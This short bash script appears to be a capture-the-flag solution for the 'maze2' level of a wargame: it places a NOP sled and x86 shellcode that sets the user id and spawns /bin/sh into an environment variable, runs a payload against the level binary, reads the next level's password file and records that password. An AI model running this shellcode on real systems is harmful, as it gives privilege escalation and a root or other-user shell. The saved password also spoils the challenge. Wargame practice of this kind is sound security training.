#!/bin/bash
# maze2 will run the code at address of argv[1]
# make EGG and set the address of EGG to argv[1]
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 16 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

mkdir /tmp/ballban_maze2
cd /tmp/ballban_maze2
nano check_env.c
/tmp/ballban_maze2/check_env EGG # 0xffffdde1

nano payload.py
/maze/maze2 $(python3 payload.py)
cat /etc/maze_pass/maze3
# password: DSEiCewQOv